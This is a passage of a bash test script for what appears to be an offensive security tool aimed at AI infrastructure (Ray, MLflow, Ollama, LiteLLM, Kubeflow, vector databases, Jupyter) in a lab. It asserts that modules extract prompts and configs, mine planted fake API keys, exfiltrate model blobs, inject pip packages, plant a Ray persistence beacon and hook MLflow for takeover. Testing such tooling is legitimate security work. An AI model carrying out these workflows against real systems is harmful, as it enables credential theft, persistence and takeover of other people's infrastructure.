        assert_contains "litellm-probe exposes version" "litellm_version" "$TMPDIR/litellm-probe.json"
    fi

    # ── litellm dedicated module ──
    if assert_artifact_ok "litellm-enum" "$TMPDIR/litellm-enum.json"; then
        assert_jq "litellm enum returns findings" '.findings[]?' "$TMPDIR/litellm-enum.json"
        assert_jq "litellm enum exposes version" '.findings[]? | select(.metadata.litellm_version != null)' "$TMPDIR/litellm-enum.json"
    fi
    if assert_artifact_ok "litellm-config-extract" "$TMPDIR/litellm-config-extract.json"; then
        assert_jq "litellm config-extract returns findings" '.findings[]?' "$TMPDIR/litellm-config-extract.json"
        assert_regex "litellm config-extract reveals config params" 'litellm_params|api_base|api_key|model' "$TMPDIR/litellm-config-extract.json"
    fi
    if assert_artifact_ok "litellm-budget-probe" "$TMPDIR/litellm-budget-probe.json"; then
        assert_jq "litellm budget-probe returns findings" '.findings[]?' "$TMPDIR/litellm-budget-probe.json"
    fi
    if assert_artifact_ok "litellm-proxy-chain" "$TMPDIR/litellm-proxy-chain.json"; then
        assert_jq "litellm proxy-chain returns findings" '.findings[]?' "$TMPDIR/litellm-proxy-chain.json"
        assert_regex "litellm proxy-chain maps providers" 'openai|anthropic|ollama|unknown' "$TMPDIR/litellm-proxy-chain.json"
    fi

    # ── prompt-extract ──
    if assert_artifact_ok "oai-prompt-extract" "$TMPDIR/oai-prompt-extract.json"; then
        assert_jq "openai-compat prompt-extract returns findings" '.findings[]?' "$TMPDIR/oai-prompt-extract.json"
    fi

    # ── tool-enum ──
    if assert_artifact_ok "oai-tool-enum" "$TMPDIR/oai-tool-enum.json"; then
        assert_jq "openai-compat tool-enum returns findings" '.findings[]?' "$TMPDIR/oai-tool-enum.json"
    fi

    # ── prompt-test ──
    if assert_artifact_ok "oai-prompt-test" "$TMPDIR/oai-prompt-test.json"; then
        assert_jq "openai-compat prompt-test returns findings" '.findings[]?' "$TMPDIR/oai-prompt-test.json"
    fi

    # ── ray ──
    if assert_artifact_ok "ray-enum" "$TMPDIR/ray-enum.json"; then
        assert_jq "ray enum marks jobs API reachable" '.findings[]? | select(.metadata.jobs_api_reachable == true)' "$TMPDIR/ray-enum.json"
    fi
    if assert_artifact_ok "ray-jobs" "$TMPDIR/ray-jobs.json"; then
        assert_jq "ray jobs returns a job id" '.findings[]? | select(.metadata.job_id != null)' "$TMPDIR/ray-jobs.json"
    fi
    if [[ -n "$RAY_JOB_ID" ]]; then
        if assert_artifact_ok "ray-job-logs" "$TMPDIR/ray-job-logs.json"; then
            assert_contains "ray job-logs includes selected job id" "$RAY_JOB_ID" "$TMPDIR/ray-job-logs.json"
            assert_jq "ray job-logs includes landed" '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/ray-job-logs.json"
        fi
        if assert_artifact_ok "ray-job-artifacts" "$TMPDIR/ray-job-artifacts.json"; then
            assert_contains "ray job-artifacts correlates deterministic path" "/tmp/ray-lab-artifacts/" "$TMPDIR/ray-job-artifacts.json"
        fi
        if [[ -n "$RAY_SEED_RUN_ID" ]]; then
            assert_contains "ray jobs include current seed run id" "$RAY_SEED_RUN_ID" "$TMPDIR/ray-jobs.json"
        else
            skip "ray seed run id metadata unavailable; falling back to named jobs"
        fi
    else
        fail "ray jobs returned no job ids for deeper validation"
    fi

    # ── mlflow ──
    if assert_artifact_ok "mlflow-enum" "$TMPDIR/mlflow-enum.json"; then
        assert_jq "mlflow enum reports registry reachability" '.findings[]? | select(.metadata.registry_reachable == true)' "$TMPDIR/mlflow-enum.json"
    fi
    if assert_artifact_ok "request-mlflow-search" "$TMPDIR/request-mlflow-search.json"; then
        assert_jq "per-module request returns findings" '.findings[]?' "$TMPDIR/request-mlflow-search.json"
        assert_jq "per-module request preserves module and response status" \
            '.findings[]? | select(.metadata.module == "mlflow" and .metadata.action == "request" and .metadata.response_status == 200 and .metadata.stage == "impact" and .metadata.landed == "influenced" and .metadata.mutating == true)' \
            "$TMPDIR/request-mlflow-search.json"
    fi
    if assert_artifact_ok "mlflow-experiments" "$TMPDIR/mlflow-experiments.json"; then
        assert_jq "mlflow experiments returns findings" '.findings[]?' "$TMPDIR/mlflow-experiments.json"
        assert_regex "mlflow experiments lists churn experiment" 'churn' "$TMPDIR/mlflow-experiments.json"
    fi
    if [[ -f "$TMPDIR/mlflow-runs.json" ]]; then
        if assert_artifact_ok "mlflow-runs" "$TMPDIR/mlflow-runs.json"; then
            assert_jq "mlflow runs returns findings" '.findings[]?' "$TMPDIR/mlflow-runs.json"
        fi
    else
        skip "mlflow runs skipped (no experiment_id from mlflow-experiments)"
    fi
    if [[ -f "$TMPDIR/mlflow-artifacts.json" ]]; then
        if assert_artifact_ok "mlflow-artifacts" "$TMPDIR/mlflow-artifacts.json"; then
            assert_jq "mlflow artifacts returns findings" '.findings[]?' "$TMPDIR/mlflow-artifacts.json"
        fi
    else
        skip "mlflow artifacts skipped (no run_id from mlflow-enum)"
    fi
    if assert_artifact_ok "mlflow-registry" "$TMPDIR/mlflow-registry.json"; then
        assert_contains "mlflow registry lists churn model" "acme-churn-ensemble" "$TMPDIR/mlflow-registry.json"
    fi
    if assert_artifact_ok "mlflow-model-versions" "$TMPDIR/mlflow-model-versions.json"; then
        assert_contains "mlflow model-versions lists production stage" "Production" "$TMPDIR/mlflow-model-versions.json"
    fi
    if assert_artifact_ok "mlflow-model-artifacts" "$TMPDIR/mlflow-model-artifacts.json"; then
        assert_regex "mlflow model-artifacts lists model files" '(model/MLmodel|deployment/)' "$TMPDIR/mlflow-model-artifacts.json"
    fi
    if ls "$TMPDIR"/mlflow-download*.json >/dev/null 2>&1; then
        # A given run only carries SOME artifact paths (model/MLmodel, model/config.json,
        # deployment/deployment_config.json), so the download loop tries several per run.
        # Assert that AT LEAST ONE capture returned findings rather than assuming a specific
        # artifact exists on whichever run sorts first (that ordering differs across estates).
        if cat "$TMPDIR"/mlflow-download*.json 2>/dev/null | jq -e '.findings[]?' >/dev/null 2>&1; then
            pass "mlflow download-artifact returns findings"
        else
            fail "mlflow download-artifact returns findings (no capture had any)"
        fi
    else
        skip "mlflow download-artifact skipped (no run_id from mlflow-enum)"
    fi

    # ── gradio ──
    if assert_artifact_ok "gradio-enum" "$TMPDIR/gradio-enum.json"; then
        assert_contains "gradio enum lists predict endpoint" "predict_text" "$TMPDIR/gradio-enum.json"
        assert_contains "gradio enum lists export endpoint" "export_bundle" "$TMPDIR/gradio-enum.json"
        assert_contains "gradio enum lists ingest endpoint" "ingest_file" "$TMPDIR/gradio-enum.json"
    fi

    # ── ollama ──
    if assert_artifact_ok "ollama-enum" "$TMPDIR/ollama-enum.json"; then
        assert_contains "ollama enum lists smollm2" "smollm2" "$TMPDIR/ollama-enum.json"
        assert_contains "ollama enum lists acme-assistant" "acme-assistant" "$TMPDIR/ollama-enum.json"
    fi
    if assert_artifact_ok "ollama-prompts" "$TMPDIR/ollama-prompts.json"; then
        assert_contains "ollama prompts extracts creds" "Sup3rS3cretDB" "$TMPDIR/ollama-prompts.json"
    fi
    if assert_artifact_ok "ollama-show" "$TMPDIR/ollama-show.json"; then
        assert_contains "ollama show returns model metadata" "acme-assistant" "$TMPDIR/ollama-show.json"
    fi
    if assert_artifact_ok "ollama-running" "$TMPDIR/ollama-running.json"; then
        assert_jq "ollama running returns findings" '.findings[]?' "$TMPDIR/ollama-running.json"
    fi
    if assert_artifact_ok "ollama-generate" "$TMPDIR/ollama-generate.json"; then
        assert_jq "ollama generate returns findings" '.findings[]?' "$TMPDIR/ollama-generate.json"
        assert_jq "ollama generate includes model metadata" '.findings[]? | select(.metadata.model != null)' "$TMPDIR/ollama-generate.json"
    fi

    # ── mcp env-extract ──
    if assert_artifact_ok "mcp-env-extract" "$TMPDIR/mcp-env-extract.json"; then
        assert_jq "mcp env-extract returns findings" '.findings[]?' "$TMPDIR/mcp-env-extract.json"
    fi

    # ── jupyter kernels ──
    if assert_artifact_ok "jupyter-kernels" "$TMPDIR/jupyter-kernels.json"; then
        assert_jq "jupyter kernels returns valid output" '.findings | type == "array"' "$TMPDIR/jupyter-kernels.json"
    fi

    # ── bentoml ──
    if assert_artifact_ok "bentoml-enum" "$TMPDIR/bentoml-enum.json"; then
        assert_jq "bentoml enum returns findings" '.findings[]?' "$TMPDIR/bentoml-enum.json"
        assert_contains "bentoml enum includes service name" "acme-classifier" "$TMPDIR/bentoml-enum.json"
    fi
    if assert_artifact_ok "bentoml-routes" "$TMPDIR/bentoml-routes.json"; then
        assert_jq "bentoml routes returns findings" '.findings[]?' "$TMPDIR/bentoml-routes.json"
        assert_contains "bentoml routes includes predict endpoint" "predict" "$TMPDIR/bentoml-routes.json"
        assert_jq "bentoml routes emits concrete predict follow-on" \
            '.findings[]? | select(.metadata.workflow.recommendations[]?.command | contains("bentoml") and contains("predict") and contains("--endpoint /predict") and contains("--payload"))' \
            "$TMPDIR/bentoml-routes.json"
    fi
    if assert_artifact_ok "bentoml-metrics" "$TMPDIR/bentoml-metrics.json"; then
        assert_jq "bentoml metrics returns findings" '.findings[]?' "$TMPDIR/bentoml-metrics.json"
    fi

    # ── torchserve ──
    if assert_artifact_ok "torchserve-enum" "$TMPDIR/torchserve-enum.json"; then
        assert_jq "torchserve enum returns findings" '.findings[]?' "$TMPDIR/torchserve-enum.json"
    fi
    if assert_artifact_ok "torchserve-models" "$TMPDIR/torchserve-models.json"; then
        assert_jq "torchserve models returns findings" '.findings[]?' "$TMPDIR/torchserve-models.json"
        assert_contains "torchserve models lists acme-sentiment" "acme-sentiment" "$TMPDIR/torchserve-models.json"
    fi
    if assert_artifact_ok "torchserve-metrics" "$TMPDIR/torchserve-metrics.json"; then
        assert_jq "torchserve metrics returns findings" '.findings[]?' "$TMPDIR/torchserve-metrics.json"
    fi

    # ── triton ──
    if assert_artifact_ok "triton-enum" "$TMPDIR/triton-enum.json"; then
        assert_jq "triton enum returns findings" '.findings[]?' "$TMPDIR/triton-enum.json"
        assert_contains "triton enum includes server version" "2.42.0" "$TMPDIR/triton-enum.json"
    fi
    if assert_artifact_ok "triton-models" "$TMPDIR/triton-models.json"; then
        assert_jq "triton models returns findings" '.findings[]?' "$TMPDIR/triton-models.json"
        assert_contains "triton models lists acme-fraud-detector" "acme-fraud-detector" "$TMPDIR/triton-models.json"
    fi
    if assert_artifact_ok "triton-model-config" "$TMPDIR/triton-model-config.json"; then
        assert_jq "triton model-config returns findings" '.findings[]?' "$TMPDIR/triton-model-config.json"
    fi
    if assert_artifact_ok "triton-shm-probe" "$TMPDIR/triton-shm-probe.json"; then
        assert_jq "triton shm-probe returns findings" '.findings[]?' "$TMPDIR/triton-shm-probe.json"
    fi

    # ── tfserving ──
    if assert_artifact_ok "tfserving-enum" "$TMPDIR/tfserving-enum.json"; then
        assert_jq "tfserving enum returns findings" '.findings[]?' "$TMPDIR/tfserving-enum.json"
    fi
    if assert_artifact_ok "tfserving-models" "$TMPDIR/tfserving-models.json"; then
        assert_jq "tfserving models returns findings" '.findings[]?' "$TMPDIR/tfserving-models.json"
        assert_contains "tfserving models lists acme-fraud-scorer" "acme-fraud-scorer" "$TMPDIR/tfserving-models.json"
    fi
    if assert_artifact_ok "tfserving-metadata" "$TMPDIR/tfserving-metadata.json"; then
        assert_jq "tfserving metadata returns findings" '.findings[]?' "$TMPDIR/tfserving-metadata.json"
        assert_jq "tfserving metadata emits concrete predict follow-on" \
            '.findings[]? | select(.metadata.workflow.recommendations[]?.command | contains("tfserving") and contains("predict") and contains("--model acme-fraud-scorer") and contains("--payload"))' \
            "$TMPDIR/tfserving-metadata.json"
    fi
    if assert_artifact_ok "tfserving-metrics" "$TMPDIR/tfserving-metrics.json"; then
        assert_jq "tfserving metrics returns findings" '.findings[]?' "$TMPDIR/tfserving-metrics.json"
    fi

    # ── wandb ──
    if assert_artifact_ok "wandb-enum" "$TMPDIR/wandb-enum.json"; then
        assert_jq "wandb enum returns findings" '.findings[]?' "$TMPDIR/wandb-enum.json"
        assert_contains "wandb enum includes version" "0.42.0" "$TMPDIR/wandb-enum.json"
    fi
    if assert_artifact_ok "wandb-projects" "$TMPDIR/wandb-projects.json"; then
        assert_jq "wandb projects returns findings" '.findings[]?' "$TMPDIR/wandb-projects.json"
        assert_contains "wandb projects lists churn-prediction" "churn-prediction" "$TMPDIR/wandb-projects.json"
        assert_contains "wandb projects lists fraud-detection" "fraud-detection" "$TMPDIR/wandb-projects.json"
    fi
    if assert_artifact_ok "wandb-runs" "$TMPDIR/wandb-runs.json"; then
        assert_jq "wandb runs returns findings" '.findings[]?' "$TMPDIR/wandb-runs.json"
        assert_count_ge "wandb runs count" 2 \
            "$(jq '[.findings[]?.metadata.run_count? // empty] | max // 0' "$TMPDIR/wandb-runs.json" 2>/dev/null || echo 0)"
    fi
    if assert_artifact_ok "wandb-artifacts" "$TMPDIR/wandb-artifacts.json"; then
        assert_jq "wandb artifacts returns findings" '.findings[]?' "$TMPDIR/wandb-artifacts.json"
    fi

    # ── kubeflow (v1beta1+v2beta1 on :9000) ──
    if assert_artifact_ok "kubeflow-enum" "$TMPDIR/kubeflow-enum.json"; then
        assert_jq "kubeflow enum returns findings" '.findings[]?' "$TMPDIR/kubeflow-enum.json"
        assert_jq "kubeflow enum reports api_version" \
            '.findings[]? | select(.metadata.api_version != null)' "$TMPDIR/kubeflow-enum.json"
    fi
    if assert_artifact_ok "kubeflow-pipelines" "$TMPDIR/kubeflow-pipelines.json"; then
        assert_jq "kubeflow pipelines returns findings" '.findings[]?' "$TMPDIR/kubeflow-pipelines.json"
        assert_contains "kubeflow pipelines exposes planted HF token" "hf_FAKE" "$TMPDIR/kubeflow-pipelines.json"
        assert_jq "kubeflow pipelines have non-empty names" \
            '[.findings[]? | select((.metadata.pipeline_name // "") != "")] | length > 0' \
            "$TMPDIR/kubeflow-pipelines.json"
    fi
    if assert_artifact_ok "kubeflow-runs" "$TMPDIR/kubeflow-runs.json"; then
        assert_jq "kubeflow runs returns findings" '.findings[]?' "$TMPDIR/kubeflow-runs.json"
    fi

    # ── kubeflow v2beta1-only (:9001) — P1-8 ──
    # A modern KFP 2.x cluster serves only /apis/v2beta1 with renamed fields
    # (display_name/pipeline_id). These FAIL until aipostex parses v2beta1.
    if assert_artifact_ok "kubeflow-v2-enum" "$TMPDIR/kubeflow-v2-enum.json"; then
        assert_jq "kubeflow v2 enum detects v2beta1 API" \
            '.findings[]? | select(.metadata.api_version == "v2beta1")' "$TMPDIR/kubeflow-v2-enum.json"
    fi
    if assert_artifact_ok "kubeflow-v2-pipelines" "$TMPDIR/kubeflow-v2-pipelines.json"; then
        assert_jq "kubeflow v2 pipelines returns findings" '.findings[]?' "$TMPDIR/kubeflow-v2-pipelines.json"
        assert_jq "kubeflow v2 pipelines have non-empty names" \
            '[.findings[]? | select((.metadata.pipeline_name // "") != "")] | length > 0' \
            "$TMPDIR/kubeflow-v2-pipelines.json"
        assert_contains "kubeflow v2 pipelines exposes planted HF token" "hf_FAKE" "$TMPDIR/kubeflow-v2-pipelines.json"
    fi

    # ── a2a ──
    if assert_artifact_ok "a2a-enum" "$TMPDIR/a2a-enum.json"; then
        assert_jq "a2a enum returns findings" '.findings[]?' "$TMPDIR/a2a-enum.json"
        assert_jq "a2a enum reports skill count" \
            '.findings[]? | select(.metadata.skill_count != null)' "$TMPDIR/a2a-enum.json"
    fi
    if assert_artifact_ok "a2a-tasks" "$TMPDIR/a2a-tasks.json"; then
        assert_jq "a2a tasks returns findings" '.findings[]?' "$TMPDIR/a2a-tasks.json"
    fi

    # ── templates ──
    if [[ -s "$TMPDIR/templates-list.txt" ]]; then
        assert_contains "templates list shows loaded templates" "template" "$TMPDIR/templates-list.txt"
        assert_contains "templates list includes MCP category" "MCP" "$TMPDIR/templates-list.txt"
    else
        fail "templates list produced empty output"
    fi
    if [[ -f "$TMPDIR/templates-info.txt" && -s "$TMPDIR/templates-info.txt" ]]; then
        assert_contains "templates info shows template details" "Severity" "$TMPDIR/templates-info.txt"
    else
        skip "templates info skipped (no template ID extracted)"
    fi

    # ── vectordb ──
    if assert_artifact_ok "chromadb-enum" "$TMPDIR/chromadb-enum.json"; then
        assert_contains "chromadb enum lists acme-knowledge-base" "acme-knowledge-base" "$TMPDIR/chromadb-enum.json"
    fi
    if assert_artifact_ok "weaviate-enum" "$TMPDIR/weaviate-enum.json"; then
        assert_contains "weaviate enum lists ResearchDocument" "ResearchDocument" "$TMPDIR/weaviate-enum.json"
    fi
    if assert_artifact_ok "qdrant-enum" "$TMPDIR/qdrant-enum.json"; then
        assert_contains "qdrant enum lists product-catalog" "product-catalog" "$TMPDIR/qdrant-enum.json"
        assert_regex "qdrant enum reports real version" '1\.[0-9]+\.[0-9]+' "$TMPDIR/qdrant-enum.json"
    fi

    # ── pagination ──
    if assert_artifact_ok "chromadb-extract" "$TMPDIR/chromadb-extract.json"; then
        assert_jq "chromadb extract returns 50+ documents" \
            '[.findings[]?] | length > 50' "$TMPDIR/chromadb-extract.json"
    fi
    if assert_artifact_ok "weaviate-extract" "$TMPDIR/weaviate-extract.json"; then
        assert_jq "weaviate extract returns 100+ documents" \
            '[.findings[]?] | length > 100' "$TMPDIR/weaviate-extract.json"
    fi
    if assert_artifact_ok "qdrant-extract" "$TMPDIR/qdrant-extract.json"; then
        assert_jq "qdrant extract returns 100+ points" \
            '[.findings[]?] | length > 100' "$TMPDIR/qdrant-extract.json"
    fi

    # ── vectordb search-sensitive ──
    if assert_artifact_ok "chromadb-search-sensitive" "$TMPDIR/chromadb-search-sensitive.json"; then
        assert_jq "chromadb search-sensitive returns findings" '.findings[]? | select(.metadata.action == "search-sensitive")' "$TMPDIR/chromadb-search-sensitive.json"
    fi
    if assert_artifact_ok "weaviate-search-sensitive" "$TMPDIR/weaviate-search-sensitive.json"; then
        assert_jq "weaviate search-sensitive returns findings" '.findings[]? | select(.metadata.action == "search-sensitive")' "$TMPDIR/weaviate-search-sensitive.json"
    fi
    if assert_artifact_ok "qdrant-search-sensitive" "$TMPDIR/qdrant-search-sensitive.json"; then
        assert_jq "qdrant search-sensitive returns findings" '.findings[]? | select(.metadata.action == "search-sensitive")' "$TMPDIR/qdrant-search-sensitive.json"
    fi

    # ── jupyter ──
    if assert_artifact_ok "jupyter-enum" "$TMPDIR/jupyter-enum.json"; then
        assert_jq "jupyter enum returns findings" '.findings[]?' "$TMPDIR/jupyter-enum.json"
    fi
    if assert_artifact_ok "jupyter-ds-enum" "$TMPDIR/jupyter-ds-enum.json"; then
        assert_jq "jupyter-ds enum returns findings" '.findings[]?' "$TMPDIR/jupyter-ds-enum.json"
    fi
    if assert_artifact_ok "jupyter-notebooks" "$TMPDIR/jupyter-notebooks.json"; then
        assert_jq "jupyter notebooks lists notebooks" '.findings[]?' "$TMPDIR/jupyter-notebooks.json"
    fi
    if assert_artifact_ok "jupyter-notebooks-secrets" "$TMPDIR/jupyter-notebooks-secrets.json"; then
        assert_contains "jupyter notebooks --mine-secrets finds API key" "sk-proj-FAKE" "$TMPDIR/jupyter-notebooks-secrets.json"
    fi
    if assert_artifact_ok "jupyter-read-notebook" "$TMPDIR/jupyter-read-notebook.json"; then
        assert_contains "jupyter read-notebook finds API key" "sk-proj-FAKE" "$TMPDIR/jupyter-read-notebook.json"
    fi

    # ── scan-files devuser (optional) ──
    if [[ -f "$TMPDIR/scan-files-devuser.json" ]]; then
        assert_contains "scan-files devuser finds OpenAI key" "sk-proj-FAKE" "$TMPDIR/scan-files-devuser.json"
        assert_contains "scan-files devuser finds HuggingFace token" "hf_FAKE" "$TMPDIR/scan-files-devuser.json"
        assert_contains "scan-files devuser finds Anthropic key" "sk-ant-FAKE" "$TMPDIR/scan-files-devuser.json"
    else
        skip "scan-files devuser skipped (SSH to ailab-dev unavailable or aipostex not on target)"
    fi

    # ── model-scan (requires seeded model files on attack box) ──
    local model_scan_dir="$HOME/lab/model-scan-fixtures"
    if [[ -d "$model_scan_dir" ]]; then
        # Console output goes to stderr; capture machine-readable JSON on stdout.
        run_capture "model-scan" "$TMPDIR/model-scan.json" "$TMPDIR/model-scan.stderr" \
            "$AIPOSTEX" model-scan --path "$model_scan_dir" --format json
        if assert_artifact_ok "model-scan" "$TMPDIR/model-scan.json"; then
            assert_regex "model-scan detects risky formats" 'pickle|pytorch|deserialization' "$TMPDIR/model-scan.json"
        fi
    else
        skip "model-scan skipped (no fixtures at $model_scan_dir)"
    fi

    # ── report pipeline (uses scan-network findings) ──
    if [[ -f "$TMPDIR/scan-network.json" ]]; then
        run_capture "report-html" "$TMPDIR/report.html" "$TMPDIR/report-html.stderr" \
            "$AIPOSTEX" report render "$TMPDIR/scan-network.json" --format html
        if [[ -s "$TMPDIR/report.html" ]]; then
            pass "report render HTML produces output"
            assert_contains "report HTML contains severity summary" "severity" "$TMPDIR/report.html"
        else
            fail "report render HTML produced empty output"
        fi

        run_capture "report-json" "$TMPDIR/report-render.json" "$TMPDIR/report-json.stderr" \
            "$AIPOSTEX" report render "$TMPDIR/scan-network.json" --format json
        if [[ -s "$TMPDIR/report-render.json" ]]; then
            pass "report render JSON produces output"
        else
            fail "report render JSON produced empty output"
        fi

        run_capture "report-summary" "$TMPDIR/report-summary-stdout.txt" "$TMPDIR/report-summary.stderr" \
            "$AIPOSTEX" report summary "$TMPDIR/scan-network.json" --output "$TMPDIR/report-summary.json"
        if [[ -s "$TMPDIR/report-summary.json" ]]; then
            pass "report summary produces output"
        else
            fail "report summary produced empty output"
        fi

        run_capture "report-graph" "$TMPDIR/report-graph.txt" "$TMPDIR/report-graph.stderr" \
            "$AIPOSTEX" report graph --input "$TMPDIR/scan-network.json" --format mermaid
        if [[ -s "$TMPDIR/report-graph.txt" ]]; then
            pass "report graph produces mermaid output"
            assert_contains "report graph contains graph directive" "graph" "$TMPDIR/report-graph.txt"
        else
            fail "report graph produced empty output"
        fi
    else
        skip "report pipeline skipped (no scan-network.json)"
    fi

    # ── engagement merge ──
    local merge_input_1="" merge_input_2=""
    for f in "$TMPDIR"/ollama-enum.json "$TMPDIR"/gradio-enum.json "$TMPDIR"/ray-enum.json "$TMPDIR"/mlflow-enum.json; do
        if [[ -f "$f" ]]; then
            if [[ -z "$merge_input_1" ]]; then
                merge_input_1="$f"
            elif [[ -z "$merge_input_2" ]]; then
                merge_input_2="$f"
                break
            fi
        fi
    done
    if [[ -n "$merge_input_1" && -n "$merge_input_2" ]]; then
        run_capture "engagement-merge" "$TMPDIR/engagement-merged.json" "$TMPDIR/engagement-merge.stderr" \
            "$AIPOSTEX" engagement merge "$merge_input_1" "$merge_input_2" -o "$TMPDIR/engagement-merged.json"
        if [[ -s "$TMPDIR/engagement-merged.json" ]]; then
            pass "engagement merge produces output"
            assert_jq "engagement merge contains findings" '.findings[]?' "$TMPDIR/engagement-merged.json"
        else
            fail "engagement merge produced empty output"
        fi

        run_capture "engagement-bundle" "$TMPDIR/engagement-bundle.zip" "$TMPDIR/engagement-bundle.stderr" \
            "$AIPOSTEX" engagement bundle --input "$TMPDIR/engagement-merged.json" \
            --output "$TMPDIR/engagement-bundle.zip"
        if [[ -s "$TMPDIR/engagement-bundle.zip" ]]; then
            pass "engagement bundle produces zip"
        else
            fail "engagement bundle produced empty output"
        fi
    else
        skip "engagement merge/bundle skipped (fewer than 2 module outputs available)"
    fi
}


# ══════════════════════════════════════════════════════════════
# ACTIVE — gated exploit workflows with bounded proofs
# ══════════════════════════════════════════════════════════════

run_active_layer() {
    section "active"
    prepare_read_only_artifacts
    prepare_active_artifacts

    if assert_artifact_ok "scan-network-full" "$TMPDIR/scan-network-full.json"; then
        assert_contains "scan-network full includes exploit template" "mcp-cmdi-001" "$TMPDIR/scan-network-full.json"
    fi
    if assert_artifact_ok "ollama-exfiltrate" "$TMPDIR/ollama-exfiltrate.json"; then
        assert_jq "ollama exfiltrate returns findings" '.findings[]?' "$TMPDIR/ollama-exfiltrate.json"
        assert_jq "ollama exfiltrate includes stage/landed metadata" '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/ollama-exfiltrate.json"
        assert_jq "ollama exfiltrate honors bounded blob flags" \
            '.findings[]? | select(.metadata.action == "exfiltrate" and .metadata.max_bytes == 8192 and .metadata.per_layer == 4096)' \
            "$TMPDIR/ollama-exfiltrate.json"
        assert_jq "ollama exfiltrate does not overclaim unavailable blobs" \
            '.findings[]? | select(.metadata.action == "exfiltrate" and .metadata.bytes_read == 0 and .metadata.stage == "recon" and .metadata.landed == "reachable")' \
            "$TMPDIR/ollama-exfiltrate.json"
    fi
    if assert_artifact_ok "ray-pip-inject" "$TMPDIR/ray-pip-inject.json"; then
        assert_jq "ray pip-inject returns findings" '.findings[]?' "$TMPDIR/ray-pip-inject.json"
        assert_jq "ray pip-inject includes stage/landed metadata" '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/ray-pip-inject.json"
    fi
    if assert_artifact_ok "ray-cluster-info" "$TMPDIR/ray-cluster-info.json"; then
        assert_jq "ray cluster-info returns findings" '.findings[]?' "$TMPDIR/ray-cluster-info.json"
    fi
    if assert_artifact_ok "ray-beacon" "$TMPDIR/ray-beacon.json"; then
        assert_jq "ray beacon returns findings" '.findings[]?' "$TMPDIR/ray-beacon.json"
        assert_jq "ray beacon confirms persistence" \
            '.findings[]? | select(.metadata.action == "beacon" and .metadata.confirmed == true)' \
            "$TMPDIR/ray-beacon.json"
        assert_jq "ray beacon lands as own/execution-confirmed" \
            '.findings[]? | select(.metadata.action == "beacon" and .metadata.stage == "own" and .metadata.landed == "execution-confirmed")' \
            "$TMPDIR/ray-beacon.json"
    fi
    if assert_artifact_ok "mlflow-tamper-proof" "$TMPDIR/mlflow-tamper-proof.json"; then
        assert_jq "mlflow tamper-proof returns findings" '.findings[]?' "$TMPDIR/mlflow-tamper-proof.json"
        assert_jq "mlflow tamper-proof includes stage/landed metadata" '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/mlflow-tamper-proof.json"
    fi
    if assert_artifact_ok "mlflow-hook" "$TMPDIR/mlflow-hook.json"; then
        assert_jq "mlflow hook returns findings" '.findings[]?' "$TMPDIR/mlflow-hook.json"
        assert_jq "mlflow hook confirms downstream callback" '.findings[]? | select(.metadata.callback_confirmed == true)' "$TMPDIR/mlflow-hook.json"
        assert_jq "mlflow hook lands as takeover-capable, not execution-confirmed" \
            '.findings[]? | select(.metadata.stage == "own" and .metadata.landed == "takeover-capable")' \
            "$TMPDIR/mlflow-hook.json"
    fi
    if assert_artifact_ok "mlflow-bulk-download" "$TMPDIR/mlflow-bulk-download.json"; then
        assert_jq "mlflow bulk-download returns findings" '.findings[]?' "$TMPDIR/mlflow-bulk-download.json"
        assert_jq "mlflow bulk-download reads model artifact" \
            '.findings[]? | select(.metadata.action == "bulk-download" and .metadata.artifact_path == "model/MLmodel" and .metadata.bytes_read > 0)' \
            "$TMPDIR/mlflow-bulk-download.json"
        assert_jq "mlflow bulk-download lands as impact/takeover-capable" \
            '.findings[]? | select(.metadata.action == "bulk-download" and .metadata.artifact_path == "model/MLmodel" and .metadata.stage == "impact" and .metadata.landed == "takeover-capable")' \
            "$TMPDIR/mlflow-bulk-download.json"
        assert_jq "mlflow bulk-download does not claim execution" \
            '[.findings[]? | select(.metadata.action == "bulk-download" and .metadata.landed == "execution-confirmed")] | length == 0' \
            "$TMPDIR/mlflow-bulk-download.json"
    fi
    # WS-B: mlflow upload-artifact — a confirmed unauthenticated write to the artifact
    # store lands impact/influenced (read-back verified) and NEVER claims execution/own.
    if assert_artifact_ok "mlflow-upload-artifact" "$TMPDIR/mlflow-upload-artifact.json"; then
        assert_jq "mlflow upload-artifact confirms a write (impact/influenced, verified)" \
            '.findings[]? | select(.metadata.action == "upload-artifact" and .metadata.verified == true and .metadata.stage == "impact" and .metadata.landed == "influenced")' \
            "$TMPDIR/mlflow-upload-artifact.json"
        assert_jq "mlflow upload-artifact never claims execution/own/takeover" \
            '[.findings[]? | select(.metadata.landed == "execution-confirmed" or .metadata.landed == "takeover-capable" or .metadata.stage == "own")] | length == 0' \
            "$TMPDIR/mlflow-upload-artifact.json"
    fi
    if assert_artifact_ok "gradio-queue-probe" "$TMPDIR/gradio-queue-probe.json"; then
        assert_jq "gradio queue-probe returns findings" '.findings[]?' "$TMPDIR/gradio-queue-probe.json"
        assert_contains "gradio queue-probe detects queue" "queue" "$TMPDIR/gradio-queue-probe.json"
        assert_jq "gradio queue-probe reports join_accepted metadata" \
            '.findings[]? | select(.metadata.join_accepted != null)' \
            "$TMPDIR/gradio-queue-probe.json"
    fi
    if assert_artifact_ok "gradio-predict" "$TMPDIR/gradio-predict.json"; then
        assert_contains "gradio predict returns deterministic file ref" "/tmp/gradio-lab/exports/" "$TMPDIR/gradio-predict.json"
    fi
    if [[ -n "$GRADIO_FILE_REF" ]]; then
        if assert_artifact_ok "gradio-file-chain" "$TMPDIR/gradio-file-chain.json"; then
            assert_contains "gradio file-chain uses exported file" "$GRADIO_FILE_REF" "$TMPDIR/gradio-file-chain.json"
            assert_jq "gradio file-chain includes stage" '.findings[]? | select(.metadata.stage != null)' "$TMPDIR/gradio-file-chain.json"
        fi
        if assert_artifact_ok "gradio-upload" "$TMPDIR/gradio-upload.json"; then
            assert_jq "gradio upload-file returns findings" '.findings[]?' "$TMPDIR/gradio-upload.json"
        fi
        if [[ -f "$TMPDIR/gradio-download.json" ]] && assert_artifact_ok "gradio-download" "$TMPDIR/gradio-download.json"; then
            assert_jq "gradio download-file returns findings" '.findings[]?' "$TMPDIR/gradio-download.json"
        fi
    else
        fail "gradio predict did not return a file reference for active validations"
    fi
    if assert_artifact_ok "jupyter-start-kernel" "$TMPDIR/jupyter-start-kernel.json"; then
        assert_jq "jupyter start-kernel returns findings" '.findings[]?' "$TMPDIR/jupyter-start-kernel.json"
    fi
